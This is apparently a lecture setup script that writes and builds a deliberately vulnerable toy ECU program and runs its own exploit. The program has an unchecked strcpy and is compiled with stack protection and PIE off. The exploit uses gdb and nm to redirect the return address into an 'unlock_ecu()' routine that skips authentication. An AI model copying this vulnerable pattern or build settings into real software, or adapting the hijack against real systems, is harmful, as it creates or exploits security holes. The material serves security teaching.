#!/bin/sh
# One-shot setup for the minimal stack-overflow demo (TUM lecture).
# Writes the demo files into the current directory, builds, and self-tests.
# Targets x86-64 Linux. Not for macOS / Apple Silicon.
set -u
cd "$(dirname "$0")"

echo "==> Writing vuln.c"
cat > vuln.c <<'VULNEOF'
#include <stdio.h>
#include <string.h>
#include <unistd.h>

/* A privileged routine that, on a real ECU, should only run after a
 * proper seed-key "unlock" handshake (UDS SecurityAccess). In this toy
 * ECU there is no such check guarding it -- it exists only as a visible
 * target to hijack control flow to.
 *
 * It prints via the raw write() syscall, not printf(): when we arrive
 * here by overwriting a return address (not via a normal call), the
 * stack is not 16-byte aligned the way glibc's printf() expects, and
 * printf() can crash on that. write() has no such assumption. */
void unlock_ecu(void) {
    const char msg[] =
        "\n[ECU UNLOCKED] unlock_ecu() reached via the overflow -- a routine that\n"
        "should sit behind seed-key authentication just ran, unauthenticated.\n\n";
    write(1, msg, sizeof(msg) - 1);
}

/* Handles an incoming diagnostic request (think a UDS service on a real
 * ECU) by copying its payload into a small fixed-size stack buffer with
 * no length check -- a classic CWE-120 / 7PK Input-Validation bug. */
void handle_diagnostic_request(char *payload) {
    char buf[8];
    strcpy(buf, payload);   /* no bounds check! */
}

int main(int argc, char **argv) {
    printf("unlock_ecu() is at address: %p\n", (void *)unlock_ecu);
    if (argc < 2) {
        printf("usage: %s <diagnostic_payload>\n", argv[0]);
        return 0;
    }
    handle_diagnostic_request(argv[1]);
    puts("diagnostic request handled normally - no hijack.");
    return 0;
}
VULNEOF

echo "==> Writing build.sh"
cat > build.sh <<'BUILDEOF'
#!/bin/sh
# Educational build. Disables the stack protector and PIE so the classic
# textbook overflow is visible. NEVER build real software this way.
# Targets x86-64 Linux (e.g. your Ubuntu server). Not macOS / Apple Silicon.
cd "$(dirname "$0")"

if [ "$(uname -s)" != "Linux" ] || [ "$(uname -m)" != "x86_64" ]; then
    echo "WARNING: you are on $(uname -s)/$(uname -m), not x86-64 Linux." >&2
    echo "         Run this on your x86-64 Linux server. Continuing anyway..." >&2
    echo >&2
fi

gcc -g -O0 -fno-stack-protector -no-pie -o vuln vuln.c
status=$?
if [ $status -ne 0 ]; then
    echo "build failed (gcc exit $status). Is build-essential installed?" >&2
    echo "  sudo apt-get install build-essential gdb" >&2
    exit $status
fi

echo "Built ./vuln"
./vuln | head -1          # prints win()'s address for reference
BUILDEOF
chmod +x build.sh

echo "==> Writing exploit.sh"
cat > exploit.sh <<'EXPLOITEOF'
#!/bin/sh
# Builds the overflow input and feeds it to ./vuln, hijacking the saved
# return address so execution jumps into win(). Targets x86-64 Linux.
cd "$(dirname "$0")"

# nm prints the symbol as 'unlock_ecu' on Linux, '_unlock_ecu' on macOS.
WIN=$(nm vuln 2>/dev/null | grep -E ' T _?unlock_ecu$' | awk '{print $1}')
if [ -z "$WIN" ]; then
    echo "could not find unlock_ecu() in vuln's symbols - run ./build.sh first" >&2
    exit 1
fi

# Offset from the start of buf to the saved return address: on x86-64 the
# return address sits at [rbp+8], so this is (frame_pointer + 8) - &buf.
# We detect it live with gdb rather than hardcoding, so it's correct even
# if your compiler pads the frame differently. For char buf[8] it's 16.
OFF=$(gdb -q -batch -ex "break handle_diagnostic_request" -ex "run AAAA" \
        -ex 'printf "OFFSET=%ld\n", (long)$fp + 8 - (long)&buf' \
        ./vuln 2>/dev/null | awk -F= '/^OFFSET=/{print $2}')

if ! printf '%s' "$OFF" | grep -qE '^[0-9]+$'; then
    echo "could not auto-detect the offset. Is gdb installed? (sudo apt-get install gdb)" >&2
    exit 1
fi

echo "unlock_ecu() = 0x$WIN , offset to return address = $OFF bytes"

./vuln "$(python3 -c "
import sys
addr = 0x$WIN
# filler up to the return address, then unlock_ecu()'s low bytes (little-endian).
# strcpy's own NUL terminator supplies the zero high bytes of the address,
# so the payload itself has no NUL and passes cleanly through argv.
sys.stdout.buffer.write(b'A'*$OFF + addr.to_bytes(6,'little').rstrip(b'\x00'))
")"
EXPLOITEOF
chmod +x exploit.sh

echo "==> Writing README.md"
cat > README.md <<'READMEEOF'
# Live demo: stack buffer overflow in a toy ECU diagnostic handler

**Educational use only.** A deliberately weakened toy program for a
university lecture. Build and run it only inside an isolated VM/container.

**Runs on x86-64 Linux** (e.g. an Ubuntu server). It does *not* work on
macOS / Apple Silicon: the Mac compiler ignores `-no-pie`, forces ASLR
(so the address changes every run), and runs ARM64, where this exact
technique doesn't apply. `scp` the files to your x86-64 Linux box and run
them there.

Three files:

- `vuln.c` - a toy ECU: `handle_diagnostic_request()` copies an incoming
  diagnostic payload into a fixed buffer with no bounds check, plus
  `unlock_ecu()`, a privileged routine the program never calls.
- `build.sh` - compiles it (one `gcc` line; always produces `./vuln`).
- `exploit.sh` - overflows the buffer so execution jumps into
  `unlock_ecu()`.

## The whole idea in one picture

`handle_diagnostic_request()` has an 8-byte buffer. Right above it on the
stack sit the saved base pointer (8 bytes) and then the saved **return
address** (8 bytes) - where the CPU jumps when the function finishes:

```
   low addresses                                   high addresses
   +-------------+----------------+-------------------+
   |  buf[8]     |  saved RBP (8) |  return addr (8)  |
   +-------------+----------------+-------------------+
   ^                                ^
   strcpy writes here ------------> and keeps going, with no length check

   16 bytes of filler fill the buffer and the saved RBP,
   the next 8 bytes land exactly on the return address.
```

So 16 filler bytes, then the address of `unlock_ecu()`, and the handler
"returns" into `unlock_ecu()` instead of back to `main()`.

`unlock_ecu()` stands in for a routine that, on a real ECU, should only
run after a seed-key authentication handshake (UDS SecurityAccess). The
overflow walks straight past that check.

## Run it

```
./build.sh      # prints: Built ./vuln  +  unlock_ecu()'s address
./exploit.sh    # prints the [ECU UNLOCKED] banner - control flow hijacked
```

Expected tail of `./exploit.sh`:

```
unlock_ecu() = 0x401196 , offset to return address = 16 bytes

[ECU UNLOCKED] unlock_ecu() reached via the overflow -- a routine that
should sit behind seed-key authentication just ran, unauthenticated.

Segmentation fault
```

(The address differs on your machine - `exploit.sh` reads it from the
binary. The `Segmentation fault`/`Bus error`/`Illegal instruction` line
*after* the banner is expected: we jumped into `unlock_ecu()` but never
set up a clean way for it to return, so it crashes on the way out. The
banner printing first is the proof the hijack worked.)

## Walkthrough for the lecture

1. **Normal run.** `./vuln hello` - works fine, prints
   `diagnostic request handled normally`.
2. **Show the bug.** In `vuln.c`, `char buf[8]` with
   `strcpy(buf, payload)` and no length check (CWE-120 / 7PK Input
   Validation + API Abuse).
3. **Crash it.** `./vuln $(python3 -c 'print("A"*50)')` - segfault. The
   return address was overwritten with `0x4141414141414141` ('A' x 8),
   and the CPU tried to jump there.
4. **Find the offset.** `exploit.sh` asks gdb where the return address
   sits relative to the buffer (16 bytes for `char buf[8]`: 8 for the
   buffer + 8 for the saved RBP) and prints the value it used.
5. **Aim the overflow.** Instead of random 'A's in the return-address
   slot, put the address of `unlock_ecu()` there. `./exploit.sh` does
   exactly this and the `[ECU UNLOCKED]` banner proves the redirect.
6. **Tie it back.** On a real ECU, `unlock_ecu()` is a privileged routine
   that should sit behind an authentication check - one this bug walks
   straight past.

## Troubleshooting

- **`build.sh` prints a tool-missing error** → `sudo apt-get install
  build-essential gdb`.
- **No banner, "handled normally" instead, then a late crash** → the
  binary and the derived offset are out of sync; re-run `./build.sh`,
  then `./exploit.sh`.
- **A different crash signal (SIGSEGV / SIGBUS / SIGILL)** → all normal
  (step 5); the exact signal depends on uninitialized stack contents.

## Files

- `vuln.c` - the vulnerable toy ECU.
- `build.sh` - builds it.
- `exploit.sh` - crafts and fires the overflow; finds `unlock_ecu()`'s
  address (`nm`) and the offset (`gdb`) automatically, so neither goes
  stale across machines.
- `setup.sh` - one-shot installer that writes all of the above, builds,
  and self-tests. Safe to re-run.
READMEEOF

echo "==> Building"
./build.sh
echo ""
echo "==> Self-test: the exploit"
./exploit.sh || true
echo ""
echo "==> Done. See README.md for the lecture walkthrough."
